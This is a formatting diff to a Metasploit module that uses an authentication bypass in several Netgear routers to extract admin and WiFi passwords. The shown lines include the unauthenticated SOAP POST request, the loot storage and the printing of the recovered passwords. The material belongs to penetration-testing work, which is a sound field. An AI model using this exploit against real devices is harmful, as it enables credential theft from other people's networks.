@@ -9,7 +9,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Netgear Unauthenticated SOAP Password Extractor',
+      'Name' => 'Netgear Unauthenticated SOAP Password Extractor',
       'Description' => %q{
         This module exploits an authentication bypass vulnerability in different Netgear devices.
         It allows to extract the password for the remote management interface. This module has been
@@ -26,19 +26,17 @@ class MetasploitModule < Msf::Auxiliary
         NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton),
         NetGear WNR2000v3 - v1.1.2.10 (Tested by h00die)
       },
-      'References'  =>
-        [
-          [ 'BID', '72640' ],
-          [ 'OSVDB', '118316' ],
-          [ 'URL', 'https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR' ]
-        ],
-      'Author'      =>
-        [
-          'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery
-          'Michael Messner <devnull[at]s3cur1ty.de>',	     # Metasploit module
-          'h00die <mike@shorebreaksecurity.com>'       # Metasploit enhancements/docs
-        ],
-      'License'     => MSF_LICENSE,
+      'References' => [
+        [ 'BID', '72640' ],
+        [ 'OSVDB', '118316' ],
+        [ 'URL', 'https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR' ]
+      ],
+      'Author' => [
+        'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery
+        'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module
+        'h00die <mike@shorebreaksecurity.com>' # Metasploit enhancements/docs
+      ],
+      'License' => MSF_LICENSE,
       'DisclosureDate' => 'Feb 11 2015'
     )
   end
@@ -70,12 +68,12 @@ class MetasploitModule < Msf::Auxiliary
   def extract_data(soap_action)
     begin
       res = send_request_cgi({
-        'method'  => 'POST',
-        'uri'     => '/',
+        'method' => 'POST',
+        'uri' => '/',
         'headers' => {
           'SOAPAction' => soap_action,
         },
-        'data'    => '='
+        'data' => '='
       })
 
       return if res.nil?
@@ -98,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
         firmware_version = $1
         print_good("Firmware version #{firmware_version} found")
 
-        #store all details as loot
+        # store all details as loot
         loot = store_loot('netgear_soap_device.config', 'text/plain', rhost, res.body)
         print_good("Device details downloaded to: #{loot}")
       end
@@ -117,7 +115,6 @@ class MetasploitModule < Msf::Auxiliary
         wifi_password = $1
         print_good("Wifi Password: #{wifi_password}")
       end
-
     rescue ::Rex::ConnectionError
       vprint_error("Failed to connect to the web server")
       return
